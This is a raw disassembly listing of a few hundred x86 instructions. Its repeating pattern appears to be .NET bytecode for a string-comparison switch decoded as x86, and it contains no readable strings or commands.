  40419a:	00 38                	add    %bh,(%eax)
  40419c:	2a 2f                	sub    (%edi),%ch
  40419e:	00 00                	add    %al,(%eax)
  4041a0:	07                   	pop    %es
  4041a1:	72 0e                	jb     0x4041b1
  4041a3:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  4041a8:	00 00                	add    %al,(%eax)
  4041aa:	0a 3a                	or     (%edx),%bh
  4041ac:	c2 1b 00             	ret    $0x1b
  4041af:	00 38                	add    %bh,(%eax)
  4041b1:	15 2f 00 00 07       	adc    $0x700002f,%eax
  4041b6:	72 16                	jb     0x4041ce
  4041b8:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  4041bd:	00 00                	add    %al,(%eax)
  4041bf:	0a 3a                	or     (%edx),%bh
  4041c1:	b9 1b 00 00 38       	mov    $0x3800001b,%ecx
  4041c6:	00 2f                	add    %ch,(%edi)
  4041c8:	00 00                	add    %al,(%eax)
  4041ca:	07                   	pop    %es
  4041cb:	72 22                	jb     0x4041ef
  4041cd:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  4041d2:	00 00                	add    %al,(%eax)
  4041d4:	0a 3a                	or     (%edx),%bh
  4041d6:	b0 1b                	mov    $0x1b,%al
  4041d8:	00 00                	add    %al,(%eax)
  4041da:	38 eb                	cmp    %ch,%bl
  4041dc:	2e 00 00             	add    %al,%cs:(%eax)
  4041df:	07                   	pop    %es
  4041e0:	72 36                	jb     0x404218
  4041e2:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  4041e7:	00 00                	add    %al,(%eax)
  4041e9:	0a 3a                	or     (%edx),%bh
  4041eb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4041ec:	1b 00                	sbb    (%eax),%eax
  4041ee:	00 38                	add    %bh,(%eax)
  4041f0:	d6                   	salc
  4041f1:	2e 00 00             	add    %al,%cs:(%eax)
  4041f4:	07                   	pop    %es
  4041f5:	72 46                	jb     0x40423d
  4041f7:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  4041fc:	00 00                	add    %al,(%eax)
  4041fe:	0a 3a                	or     (%edx),%bh
  404200:	9e                   	sahf
  404201:	1b 00                	sbb    (%eax),%eax
  404203:	00 38                	add    %bh,(%eax)
  404205:	c1 2e 00             	shrl   $0x0,(%esi)
  404208:	00 07                	add    %al,(%edi)
  40420a:	72 4c                	jb     0x404258
  40420c:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  404211:	00 00                	add    %al,(%eax)
  404213:	0a 3a                	or     (%edx),%bh
  404215:	95                   	xchg   %eax,%ebp
  404216:	1b 00                	sbb    (%eax),%eax
  404218:	00 38                	add    %bh,(%eax)
  40421a:	ac                   	lods   %ds:(%esi),%al
  40421b:	2e 00 00             	add    %al,%cs:(%eax)
  40421e:	07                   	pop    %es
  40421f:	72 5a                	jb     0x40427b
  404221:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  404226:	00 00                	add    %al,(%eax)
  404228:	0a 3a                	or     (%edx),%bh
  40422a:	2a 1c 00             	sub    (%eax,%eax,1),%bl
  40422d:	00 38                	add    %bh,(%eax)
  40422f:	97                   	xchg   %eax,%edi
  404230:	2e 00 00             	add    %al,%cs:(%eax)
  404233:	07                   	pop    %es
  404234:	72 64                	jb     0x40429a
  404236:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  40423b:	00 00                	add    %al,(%eax)
  40423d:	0a 3a                	or     (%edx),%bh
  40423f:	21 1c 00             	and    %ebx,(%eax,%eax,1)
  404242:	00 38                	add    %bh,(%eax)
  404244:	82 2e 00             	subb   $0x0,(%esi)
  404247:	00 07                	add    %al,(%edi)
  404249:	72 74                	jb     0x4042bf
  40424b:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  404250:	00 00                	add    %al,(%eax)
  404252:	0a 3a                	or     (%edx),%bh
  404254:	18 1c 00             	sbb    %bl,(%eax,%eax,1)
  404257:	00 38                	add    %bh,(%eax)
  404259:	6d                   	insl   (%dx),%es:(%edi)
  40425a:	2e 00 00             	add    %al,%cs:(%eax)
  40425d:	07                   	pop    %es
  40425e:	72 84                	jb     0x4041e4
  404260:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  404265:	00 00                	add    %al,(%eax)
  404267:	0a 3a                	or     (%edx),%bh
  404269:	dc 1c 00             	fcompl (%eax,%eax,1)
  40426c:	00 38                	add    %bh,(%eax)
  40426e:	58                   	pop    %eax
  40426f:	2e 00 00             	add    %al,%cs:(%eax)
  404272:	07                   	pop    %es
  404273:	72 94                	jb     0x404209
  404275:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  40427a:	00 00                	add    %al,(%eax)
  40427c:	0a 3a                	or     (%edx),%bh
  40427e:	8c 1d 00 00 38 43    	mov    %ds,0x43380000
  404284:	2e 00 00             	add    %al,%cs:(%eax)
  404287:	07                   	pop    %es
  404288:	72 b2                	jb     0x40423c
  40428a:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  40428f:	00 00                	add    %al,(%eax)
  404291:	0a 3a                	or     (%edx),%bh
  404293:	3c 1e                	cmp    $0x1e,%al
  404295:	00 00                	add    %al,(%eax)
  404297:	38 2e                	cmp    %ch,(%esi)
  404299:	2e 00 00             	add    %al,%cs:(%eax)
  40429c:	07                   	pop    %es
  40429d:	72 c0                	jb     0x40425f
  40429f:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  4042a4:	00 00                	add    %al,(%eax)
  4042a6:	0a 3a                	or     (%edx),%bh
  4042a8:	33 1e                	xor    (%esi),%ebx
  4042aa:	00 00                	add    %al,(%eax)
  4042ac:	38 19                	cmp    %bl,(%ecx)
  4042ae:	2e 00 00             	add    %al,%cs:(%eax)
  4042b1:	07                   	pop    %es
  4042b2:	72 d4                	jb     0x404288
  4042b4:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  4042b9:	00 00                	add    %al,(%eax)
  4042bb:	0a 3a                	or     (%edx),%bh
  4042bd:	2a 1e                	sub    (%esi),%bl
  4042bf:	00 00                	add    %al,(%eax)
  4042c1:	38 04 2e             	cmp    %al,(%esi,%ebp,1)
  4042c4:	00 00                	add    %al,(%eax)
  4042c6:	07                   	pop    %es
  4042c7:	72 e6                	jb     0x4042af
  4042c9:	0d 00 70 28 8c       	or     $0x8c287000,%eax
  4042ce:	00 00                	add    %al,(%eax)
  4042d0:	0a 3a                	or     (%edx),%bh
  4042d2:	21 1e                	and    %ebx,(%esi)
  4042d4:	00 00                	add    %al,(%eax)
  4042d6:	38 ef                	cmp    %ch,%bh
  4042d8:	2d 00 00 07 72       	sub    $0x72070000,%eax
  4042dd:	f6 0d 00 70 28 8c 00 	testb  $0x0,0x8c287000
  4042e4:	00 0a                	add    %cl,(%edx)
  4042e6:	3a 18                	cmp    (%eax),%bl
  4042e8:	1e                   	push   %ds
  4042e9:	00 00                	add    %al,(%eax)
  4042eb:	38 da                	cmp    %bl,%dl
  4042ed:	2d 00 00 07 72       	sub    $0x72070000,%eax
  4042f2:	0a 0e                	or     (%esi),%cl
  4042f4:	00 70 28             	add    %dh,0x28(%eax)
  4042f7:	8c 00                	mov    %es,(%eax)
  4042f9:	00 0a                	add    %cl,(%edx)
  4042fb:	3a 0f                	cmp    (%edi),%cl
  4042fd:	1e                   	push   %ds
  4042fe:	00 00                	add    %al,(%eax)
  404300:	38 c5                	cmp    %al,%ch
  404302:	2d 00 00 07 72       	sub    $0x72070000,%eax
  404307:	16                   	push   %ss
  404308:	0e                   	push   %cs
  404309:	00 70 28             	add    %dh,0x28(%eax)
  40430c:	8c 00                	mov    %es,(%eax)
  40430e:	00 0a                	add    %cl,(%edx)
  404310:	3a 06                	cmp    (%esi),%al
  404312:	1e                   	push   %ds
  404313:	00 00                	add    %al,(%eax)
  404315:	38 b0 2d 00 00 07    	cmp    %dh,0x700002d(%eax)
  40431b:	72 2a                	jb     0x404347
  40431d:	0e                   	push   %cs
  40431e:	00 70 28             	add    %dh,0x28(%eax)
  404321:	8c 00                	mov    %es,(%eax)
  404323:	00 0a                	add    %cl,(%edx)
  404325:	3a fd                	cmp    %ch,%bh
  404327:	1d 00 00 38 9b       	sbb    $0x9b380000,%eax
  40432c:	2d 00 00 07 72       	sub    $0x72070000,%eax
  404331:	38 0e                	cmp    %cl,(%esi)
  404333:	00 70 28             	add    %dh,0x28(%eax)
  404336:	8c 00                	mov    %es,(%eax)
  404338:	00 0a                	add    %cl,(%edx)
  40433a:	3a f4                	cmp    %ah,%dh
  40433c:	1d 00 00 38 86       	sbb    $0x86380000,%eax
  404341:	2d 00 00 07 72       	sub    $0x72070000,%eax
  404346:	4a                   	dec    %edx
  404347:	0e                   	push   %cs
  404348:	00 70 28             	add    %dh,0x28(%eax)
  40434b:	8c 00                	mov    %es,(%eax)
  40434d:	00 0a                	add    %cl,(%edx)
  40434f:	3a 64 1e 00          	cmp    0x0(%esi,%ebx,1),%ah
  404353:	00 38                	add    %bh,(%eax)
  404355:	71 2d                	jno    0x404384
  404357:	00 00                	add    %al,(%eax)
  404359:	07                   	pop    %es
  40435a:	72 58                	jb     0x4043b4
  40435c:	0e                   	push   %cs
  40435d:	00 70 28             	add    %dh,0x28(%eax)
  404360:	8c 00                	mov    %es,(%eax)
  404362:	00 0a                	add    %cl,(%edx)
  404364:	3a d4                	cmp    %ah,%dl
  404366:	1e                   	push   %ds
  404367:	00 00                	add    %al,(%eax)
  404369:	38 5c 2d 00          	cmp    %bl,0x0(%ebp,%ebp,1)
  40436d:	00 07                	add    %al,(%edi)
  40436f:	72 6e                	jb     0x4043df
  404371:	0e                   	push   %cs
  404372:	00 70 28             	add    %dh,0x28(%eax)
  404375:	8c 00                	mov    %es,(%eax)
  404377:	00 0a                	add    %cl,(%edx)
  404379:	3a 10                	cmp    (%eax),%dl
  40437b:	1f                   	pop    %ds
  40437c:	00 00                	add    %al,(%eax)
  40437e:	38 47 2d             	cmp    %al,0x2d(%edi)
  404381:	00 00                	add    %al,(%eax)
  404383:	07                   	pop    %es
  404384:	72 7e                	jb     0x404404
  404386:	0e                   	push   %cs
  404387:	00 70 28             	add    %dh,0x28(%eax)
  40438a:	8c 00                	mov    %es,(%eax)
  40438c:	00 0a                	add    %cl,(%edx)
  40438e:	3a 80 1f 00 00 38    	cmp    0x3800001f(%eax),%al
  404394:	32 2d 00 00 07 72    	xor    0x72070000,%ch
  40439a:	88 0e                	mov    %cl,(%esi)
  40439c:	00 70 28             	add    %dh,0x28(%eax)
  40439f:	8c 00                	mov    %es,(%eax)
  4043a1:	00 0a                	add    %cl,(%edx)
  4043a3:	3a f8                	cmp    %al,%bh
  4043a5:	20 00                	and    %al,(%eax)
  4043a7:	00 38                	add    %bh,(%eax)
  4043a9:	1d 2d 00 00 07       	sbb    $0x700002d,%eax
  4043ae:	72 96                	jb     0x404346
  4043b0:	0e                   	push   %cs
  4043b1:	00 70 28             	add    %dh,0x28(%eax)
  4043b4:	8c 00                	mov    %es,(%eax)
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	3a f1                	cmp    %cl,%dh
  4043ba:	21 00                	and    %eax,(%eax)
  4043bc:	00 38                	add    %bh,(%eax)
  4043be:	08 2d 00 00 07 72    	or     %ch,0x72070000
  4043c4:	b2 0e                	mov    $0xe,%dl
  4043c6:	00 70 28             	add    %dh,0x28(%eax)
  4043c9:	8c 00                	mov    %es,(%eax)
  4043cb:	00 0a                	add    %cl,(%edx)
  4043cd:	3a 3b                	cmp    (%ebx),%bh
  4043cf:	22 00                	and    (%eax),%al
  4043d1:	00 38                	add    %bh,(%eax)
  4043d3:	f3 2c 00             	repz sub $0x0,%al
  4043d6:	00 07                	add    %al,(%edi)
  4043d8:	72 c8                	jb     0x4043a2
  4043da:	0e                   	push   %cs
  4043db:	00 70 28             	add    %dh,0x28(%eax)
  4043de:	8c 00                	mov    %es,(%eax)
  4043e0:	00 0a                	add    %cl,(%edx)
  4043e2:	3a 32                	cmp    (%edx),%dh
  4043e4:	22 00                	and    (%eax),%al
  4043e6:	00 38                	add    %bh,(%eax)
  4043e8:	de 2c 00             	fisubrs (%eax,%eax,1)
  4043eb:	00 07                	add    %al,(%edi)
  4043ed:	72 d6                	jb     0x4043c5
  4043ef:	0e                   	push   %cs
  4043f0:	00 70 28             	add    %dh,0x28(%eax)
  4043f3:	8c 00                	mov    %es,(%eax)
  4043f5:	00 0a                	add    %cl,(%edx)
  4043f7:	3a 29                	cmp    (%ecx),%ch
  4043f9:	22 00                	and    (%eax),%al
  4043fb:	00 38                	add    %bh,(%eax)
  4043fd:	c9                   	leave
  4043fe:	2c 00                	sub    $0x0,%al
  404400:	00 07                	add    %al,(%edi)
  404402:	72 f6                	jb     0x4043fa
  404404:	0e                   	push   %cs
  404405:	00 70 28             	add    %dh,0x28(%eax)
  404408:	8c 00                	mov    %es,(%eax)
  40440a:	00 0a                	add    %cl,(%edx)
  40440c:	3a 73 22             	cmp    0x22(%ebx),%dh
  40440f:	00 00                	add    %al,(%eax)
  404411:	38 b4 2c 00 00 07 72 	cmp    %dh,0x72070000(%esp,%ebp,1)
  404418:	12 0f                	adc    (%edi),%cl
  40441a:	00 70 28             	add    %dh,0x28(%eax)
  40441d:	8c 00                	mov    %es,(%eax)
  40441f:	00 0a                	add    %cl,(%edx)
  404421:	3a bd 22 00 00 38    	cmp    0x38000022(%ebp),%bh
  404427:	9f                   	lahf
  404428:	2c 00                	sub    $0x0,%al
  40442a:	00 07                	add    %al,(%edi)
  40442c:	72 24                	jb     0x404452
  40442e:	0f 00                	(bad)
  404430:	70 28                	jo     0x40445a
  404432:	8c 00                	mov    %es,(%eax)
  404434:	00 0a                	add    %cl,(%edx)
  404436:	3a b4 22 00 00 38 8a 	cmp    -0x75c80000(%edx,%eiz,1),%dh
  40443d:	2c 00                	sub    $0x0,%al
  40443f:	00 07                	add    %al,(%edi)
  404441:	72 42                	jb     0x404485
  404443:	0f 00                	(bad)
  404445:	70 28                	jo     0x40446f
  404447:	8c 00                	mov    %es,(%eax)
  404449:	00 0a                	add    %cl,(%edx)
  40444b:	3a ab 22 00 00 38    	cmp    0x38000022(%ebx),%ch
  404451:	75 2c                	jne    0x40447f
  404453:	00 00                	add    %al,(%eax)
  404455:	07                   	pop    %es
  404456:	72 5e                	jb     0x4044b6
  404458:	0f 00                	(bad)
  40445a:	70 28                	jo     0x404484
  40445c:	8c 00                	mov    %es,(%eax)
  40445e:	00 0a                	add    %cl,(%edx)
  404460:	3a a2 22 00 00 38    	cmp    0x38000022(%edx),%ah
  404466:	60                   	pusha
  404467:	2c 00                	sub    $0x0,%al
  404469:	00 07                	add    %al,(%edi)
  40446b:	72 88                	jb     0x4043f5
  40446d:	0f 00                	(bad)
  40446f:	70 28                	jo     0x404499
  404471:	8c 00                	mov    %es,(%eax)
  404473:	00 0a                	add    %cl,(%edx)
  404475:	3a 99 22 00 00 38    	cmp    0x38000022(%ecx),%bl
  40447b:	4b                   	dec    %ebx
  40447c:	2c 00                	sub    $0x0,%al
  40447e:	00 07                	add    %al,(%edi)
  404480:	72 b0                	jb     0x404432
  404482:	0f 00                	(bad)
  404484:	70 28                	jo     0x4044ae
  404486:	8c 00                	mov    %es,(%eax)
  404488:	00 0a                	add    %cl,(%edx)
  40448a:	3a 90 22 00 00 38    	cmp    0x38000022(%eax),%dl
  404490:	36 2c 00             	ss sub $0x0,%al
  404493:	00 07                	add    %al,(%edi)
  404495:	72 c4                	jb     0x40445b
  404497:	0f 00                	(bad)
  404499:	70 28                	jo     0x4044c3
  40449b:	8c 00                	mov    %es,(%eax)
  40449d:	00 0a                	add    %cl,(%edx)
  40449f:	3a 87 22 00 00 38    	cmp    0x38000022(%edi),%al
  4044a5:	21 2c 00             	and    %ebp,(%eax,%eax,1)
  4044a8:	00 07                	add    %al,(%edi)
  4044aa:	72 d8                	jb     0x404484
  4044ac:	0f 00                	(bad)
  4044ae:	70 28                	jo     0x4044d8
  4044b0:	8c 00                	mov    %es,(%eax)
  4044b2:	00 0a                	add    %cl,(%edx)
  4044b4:	3a 7e 22             	cmp    0x22(%esi),%bh
  4044b7:	00 00                	add    %al,(%eax)
  4044b9:	38 0c 2c             	cmp    %cl,(%esp,%ebp,1)
  4044bc:	00 00                	add    %al,(%eax)
  4044be:	07                   	pop    %es
  4044bf:	72 ee                	jb     0x4044af
  4044c1:	0f 00                	(bad)
  4044c3:	70 28                	jo     0x4044ed
  4044c5:	8c 00                	mov    %es,(%eax)
  4044c7:	00 0a                	add    %cl,(%edx)
  4044c9:	3a 75 22             	cmp    0x22(%ebp),%dh
  4044cc:	00 00                	add    %al,(%eax)
  4044ce:	38 f7                	cmp    %dh,%bh
  4044d0:	2b 00                	sub    (%eax),%eax
  4044d2:	00 07                	add    %al,(%edi)
  4044d4:	72 f8                	jb     0x4044ce
  4044d6:	0f 00                	(bad)
  4044d8:	70 28                	jo     0x404502
  4044da:	8c 00                	mov    %es,(%eax)
  4044dc:	00 0a                	add    %cl,(%edx)
  4044de:	3a bf 22 00 00 38    	cmp    0x38000022(%edi),%bh
  4044e4:	e2 2b                	loop   0x404511
  4044e6:	00 00                	add    %al,(%eax)
  4044e8:	07                   	pop    %es
  4044e9:	72 0c                	jb     0x4044f7
  4044eb:	10 00                	adc    %al,(%eax)
  4044ed:	70 28                	jo     0x404517
  4044ef:	8c 00                	mov    %es,(%eax)
  4044f1:	00 0a                	add    %cl,(%edx)
  4044f3:	3a 6f 23             	cmp    0x23(%edi),%ch
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	38 cd                	cmp    %cl,%ch
  4044fa:	2b 00                	sub    (%eax),%eax
  4044fc:	00 07                	add    %al,(%edi)
  4044fe:	72 24                	jb     0x404524
  404500:	10 00                	adc    %al,(%eax)
  404502:	70 28                	jo     0x40452c
  404504:	8c 00                	mov    %es,(%eax)
  404506:	00 0a                	add    %cl,(%edx)
  404508:	3a 66 23             	cmp    0x23(%esi),%ah
  40450b:	00 00                	add    %al,(%eax)
  40450d:	38 b8 2b 00 00 07    	cmp    %bh,0x700002b(%eax)
  404513:	72 32                	jb     0x404547
  404515:	10 00                	adc    %al,(%eax)
  404517:	70 28                	jo     0x404541
  404519:	8c 00                	mov    %es,(%eax)
  40451b:	00 0a                	add    %cl,(%edx)
  40451d:	3a 1b                	cmp    (%ebx),%bl
  40451f:	24 00                	and    $0x0,%al
  404521:	00 38                	add    %bh,(%eax)
  404523:	a3 2b 00 00 07       	mov    %eax,0x700002b
  404528:	72 42                	jb     0x40456c
  40452a:	10 00                	adc    %al,(%eax)
  40452c:	70 28                	jo     0x404556
  40452e:	8c 00                	mov    %es,(%eax)
  404530:	00 0a                	add    %cl,(%edx)
  404532:	3a 44 25 00          	cmp    0x0(%ebp,%eiz,1),%al
  404536:	00 38                	add    %bh,(%eax)
  404538:	8e 2b                	mov    (%ebx),%gs
  40453a:	00 00                	add    %al,(%eax)
  40453c:	07                   	pop    %es
  40453d:	72 58                	jb     0x404597
  40453f:	10 00                	adc    %al,(%eax)
  404541:	70 28                	jo     0x40456b
  404543:	8c 00                	mov    %es,(%eax)
  404545:	00 0a                	add    %cl,(%edx)
  404547:	3a 3b                	cmp    (%ebx),%bh
  404549:	25 00 00 38 79       	and    $0x79380000,%eax
  40454e:	2b 00                	sub    (%eax),%eax
  404550:	00 07                	add    %al,(%edi)
  404552:	72 66                	jb     0x4045ba
  404554:	10 00                	adc    %al,(%eax)
  404556:	70 28                	jo     0x404580
  404558:	8c 00                	mov    %es,(%eax)
  40455a:	00 0a                	add    %cl,(%edx)
  40455c:	3a eb                	cmp    %bl,%ch
  40455e:	25 00 00 38 64       	and    $0x64380000,%eax
  404563:	2b 00                	sub    (%eax),%eax
  404565:	00 07                	add    %al,(%edi)
  404567:	72 7c                	jb     0x4045e5
  404569:	10 00                	adc    %al,(%eax)
  40456b:	70 28                	jo     0x404595
  40456d:	8c 00                	mov    %es,(%eax)
  40456f:	00 0a                	add    %cl,(%edx)
  404571:	3a 9b 26 00 00 38    	cmp    0x38000026(%ebx),%bl
  404577:	4f                   	dec    %edi
  404578:	2b 00                	sub    (%eax),%eax
  40457a:	00 07                	add    %al,(%edi)
  40457c:	72 86                	jb     0x404504
  40457e:	10 00                	adc    %al,(%eax)
  404580:	70 28                	jo     0x4045aa
  404582:	8c 00                	mov    %es,(%eax)
  404584:	00 0a                	add    %cl,(%edx)
  404586:	3a 86 27 00 00 38    	cmp    0x38000027(%esi),%al
  40458c:	3a 2b                	cmp    (%ebx),%ch
  40458e:	00 00                	add    %al,(%eax)
  404590:	07                   	pop    %es
  404591:	72 9a                	jb     0x40452d
  404593:	10 00                	adc    %al,(%eax)
  404595:	70 28                	jo     0x4045bf
  404597:	8c 00                	mov    %es,(%eax)
  404599:	00 0a                	add    %cl,(%edx)
  40459b:	3a 7d 27             	cmp    0x27(%ebp),%bh
  40459e:	00 00                	add    %al,(%eax)
  4045a0:	38 25 2b 00 00 07    	cmp    %ah,0x700002b
  4045a6:	72 a2                	jb     0x40454a
  4045a8:	10 00                	adc    %al,(%eax)
  4045aa:	70 28                	jo     0x4045d4
  4045ac:	8c 00                	mov    %es,(%eax)
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	3a 2d 28 00 00 38    	cmp    0x38000028,%ch
  4045b6:	10 2b                	adc    %ch,(%ebx)
  4045b8:	00 00                	add    %al,(%eax)
  4045ba:	07                   	pop    %es
  4045bb:	72 b6                	jb     0x404573
  4045bd:	10 00                	adc    %al,(%eax)
  4045bf:	70 28                	jo     0x4045e9
  4045c1:	8c 00                	mov    %es,(%eax)
  4045c3:	00 0a                	add    %cl,(%edx)
  4045c5:	3a dd                	cmp    %ch,%bl
  4045c7:	28 00                	sub    %al,(%eax)
  4045c9:	00 38                	add    %bh,(%eax)
  4045cb:	fb                   	sti
  4045cc:	2a 00                	sub    (%eax),%al
  4045ce:	00 07                	add    %al,(%edi)
  4045d0:	72 c6                	jb     0x404598
  4045d2:	10 00                	adc    %al,(%eax)
  4045d4:	70 28                	jo     0x4045fe
  4045d6:	8c 00                	mov    %es,(%eax)
  4045d8:	00 0a                	add    %cl,(%edx)
  4045da:	3a d4                	cmp    %ah,%dl
  4045dc:	28 00                	sub    %al,(%eax)
  4045de:	00 38                	add    %bh,(%eax)
  4045e0:	e6 2a                	out    %al,$0x2a
  4045e2:	00 00                	add    %al,(%eax)
  4045e4:	07                   	pop    %es
  4045e5:	72 d0                	jb     0x4045b7
  4045e7:	10 00                	adc    %al,(%eax)
  4045e9:	70 28                	jo     0x404613
  4045eb:	8c 00                	mov    %es,(%eax)
  4045ed:	00 0a                	add    %cl,(%edx)
  4045ef:	3a cb                	cmp    %bl,%cl
  4045f1:	28 00                	sub    %al,(%eax)
  4045f3:	00 38                	add    %bh,(%eax)
  4045f5:	d1 2a                	shrl   $1,(%edx)
  4045f7:	00 00                	add    %al,(%eax)
  4045f9:	07                   	pop    %es
  4045fa:	72 da                	jb     0x4045d6
  4045fc:	10 00                	adc    %al,(%eax)
  4045fe:	70 28                	jo     0x404628
  404600:	8c 00                	mov    %es,(%eax)
  404602:	00 0a                	add    %cl,(%edx)
  404604:	3a c2                	cmp    %dl,%al
  404606:	28 00                	sub    %al,(%eax)
  404608:	00 38                	add    %bh,(%eax)
  40460a:	bc 2a 00 00 07       	mov    $0x700002a,%esp
  40460f:	72 e8                	jb     0x4045f9
  404611:	10 00                	adc    %al,(%eax)
  404613:	70 28                	jo     0x40463d
  404615:	8c 00                	mov    %es,(%eax)
  404617:	00 0a                	add    %cl,(%edx)
  404619:	3a b9 28 00 00 38    	cmp    0x38000028(%ecx),%bh
  40461f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404620:	2a 00                	sub    (%eax),%al
  404622:	00 07                	add    %al,(%edi)
  404624:	72 fe                	jb     0x404624
  404626:	10 00                	adc    %al,(%eax)
  404628:	70 28                	jo     0x404652
  40462a:	8c 00                	mov    %es,(%eax)
  40462c:	00 0a                	add    %cl,(%edx)
  40462e:	3a b0 28 00 00 38    	cmp    0x38000028(%eax),%dh
  404634:	92                   	xchg   %eax,%edx
  404635:	2a 00                	sub    (%eax),%al
  404637:	00 07                	add    %al,(%edi)
  404639:	72 16                	jb     0x404651
  40463b:	11 00                	adc    %eax,(%eax)
  40463d:	70 28                	jo     0x404667
  40463f:	8c 00                	mov    %es,(%eax)
  404641:	00 0a                	add    %cl,(%edx)
  404643:	3a a7 28 00 00 38    	cmp    0x38000028(%edi),%ah
  404649:	7d 2a                	jge    0x404675
  40464b:	00 00                	add    %al,(%eax)
  40464d:	07                   	pop    %es
  40464e:	72 2a                	jb     0x40467a
  404650:	11 00                	adc    %eax,(%eax)
  404652:	70 28                	jo     0x40467c
  404654:	8c 00                	mov    %es,(%eax)
  404656:	00 0a                	add    %cl,(%edx)
  404658:	3a 9e 28 00 00 38    	cmp    0x38000028(%esi),%bl
  40465e:	68 2a 00 00 07       	push   $0x700002a
  404663:	72 40                	jb     0x4046a5
  404665:	11 00                	adc    %eax,(%eax)
  404667:	70 28                	jo     0x404691
  404669:	8c 00                	mov    %es,(%eax)
  40466b:	00 0a                	add    %cl,(%edx)
  40466d:	3a 95 28 00 00 38    	cmp    0x38000028(%ebp),%dl
  404673:	53                   	push   %ebx
  404674:	2a 00                	sub    (%eax),%al
  404676:	00 07                	add    %al,(%edi)
  404678:	72 52                	jb     0x4046cc
  40467a:	11 00                	adc    %eax,(%eax)
  40467c:	70 28                	jo     0x4046a6
  40467e:	8c 00                	mov    %es,(%eax)
  404680:	00 0a                	add    %cl,(%edx)
  404682:	3a 8c 28 00 00 38 3e 	cmp    0x3e380000(%eax,%ebp,1),%cl
  404689:	2a 00                	sub    (%eax),%al
  40468b:	00 07                	add    %al,(%edi)
  40468d:	72 5e                	jb     0x4046ed
  40468f:	11 00                	adc    %eax,(%eax)
  404691:	70 28                	jo     0x4046bb
  404693:	8c 00                	mov    %es,(%eax)
  404695:	00 0a                	add    %cl,(%edx)
  404697:	3a 83 28 00 00 38    	cmp    0x38000028(%ebx),%al
  40469d:	29 2a                	sub    %ebp,(%edx)
  40469f:	00 00                	add    %al,(%eax)
  4046a1:	07                   	pop    %es
  4046a2:	72 6a                	jb     0x40470e
  4046a4:	11 00                	adc    %eax,(%eax)
  4046a6:	70 28                	jo     0x4046d0
  4046a8:	8c 00                	mov    %es,(%eax)
  4046aa:	00 0a                	add    %cl,(%edx)
  4046ac:	3a 7a 28             	cmp    0x28(%edx),%bh
  4046af:	00 00                	add    %al,(%eax)
  4046b1:	38 14 2a             	cmp    %dl,(%edx,%ebp,1)
  4046b4:	00 00                	add    %al,(%eax)
  4046b6:	07                   	pop    %es
  4046b7:	72 7a                	jb     0x404733
  4046b9:	11 00                	adc    %eax,(%eax)
  4046bb:	70 28                	jo     0x4046e5
  4046bd:	8c 00                	mov    %es,(%eax)
  4046bf:	00 0a                	add    %cl,(%edx)
  4046c1:	3a 71 28             	cmp    0x28(%ecx),%dh
  4046c4:	00 00                	add    %al,(%eax)
  4046c6:	38 ff                	cmp    %bh,%bh
  4046c8:	29 00                	sub    %eax,(%eax)
  4046ca:	00 07                	add    %al,(%edi)
  4046cc:	72 82                	jb     0x404650
  4046ce:	11 00                	adc    %eax,(%eax)
  4046d0:	70 28                	jo     0x4046fa
  4046d2:	8c 00                	mov    %es,(%eax)
  4046d4:	00 0a                	add    %cl,(%edx)
  4046d6:	3a 68 28             	cmp    0x28(%eax),%ch
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	38 ea                	cmp    %ch,%dl
  4046dd:	29 00                	sub    %eax,(%eax)
  4046df:	00 07                	add    %al,(%edi)
  4046e1:	72 94                	jb     0x404677
  4046e3:	11 00                	adc    %eax,(%eax)
  4046e5:	70 28                	jo     0x40470f
  4046e7:	8c 00                	mov    %es,(%eax)
  4046e9:	00 0a                	add    %cl,(%edx)
  4046eb:	3a 5f 28             	cmp    0x28(%edi),%bl
  4046ee:	00 00                	add    %al,(%eax)
  4046f0:	38 d5                	cmp    %dl,%ch
  4046f2:	29 00                	sub    %eax,(%eax)
  4046f4:	00 07                	add    %al,(%edi)
  4046f6:	72 a4                	jb     0x40469c
  4046f8:	11 00                	adc    %eax,(%eax)
  4046fa:	70 28                	jo     0x404724
  4046fc:	8c 00                	mov    %es,(%eax)
  4046fe:	00 0a                	add    %cl,(%edx)
  404700:	3a 56 28             	cmp    0x28(%esi),%dl
  404703:	00 00                	add    %al,(%eax)
  404705:	38 c0                	cmp    %al,%al
  404707:	29 00                	sub    %eax,(%eax)
  404709:	00 07                	add    %al,(%edi)
  40470b:	72 be                	jb     0x4046cb
  40470d:	11 00                	adc    %eax,(%eax)
  40470f:	70 28                	jo     0x404739
  404711:	8c 00                	mov    %es,(%eax)
  404713:	00 0a                	add    %cl,(%edx)
  404715:	3a 4d 28             	cmp    0x28(%ebp),%cl
  404718:	00 00                	add    %al,(%eax)
  40471a:	38 ab 29 00 00 07    	cmp    %ch,0x7000029(%ebx)
  404720:	72 d4                	jb     0x4046f6
  404722:	11 00                	adc    %eax,(%eax)
  404724:	70 28                	jo     0x40474e
  404726:	8c 00                	mov    %es,(%eax)
  404728:	00 0a                	add    %cl,(%edx)
  40472a:	3a 44 28 00          	cmp    0x0(%eax,%ebp,1),%al
  40472e:	00 38                	add    %bh,(%eax)
  404730:	96                   	xchg   %eax,%esi
  404731:	29 00                	sub    %eax,(%eax)
  404733:	00 07                	add    %al,(%edi)
  404735:	72 e8                	jb     0x40471f
  404737:	11 00                	adc    %eax,(%eax)
  404739:	70 28                	jo     0x404763
  40473b:	8c 00                	mov    %es,(%eax)
  40473d:	00 0a                	add    %cl,(%edx)
  40473f:	3a 3b                	cmp    (%ebx),%bh
  404741:	28 00                	sub    %al,(%eax)
  404743:	00 38                	add    %bh,(%eax)
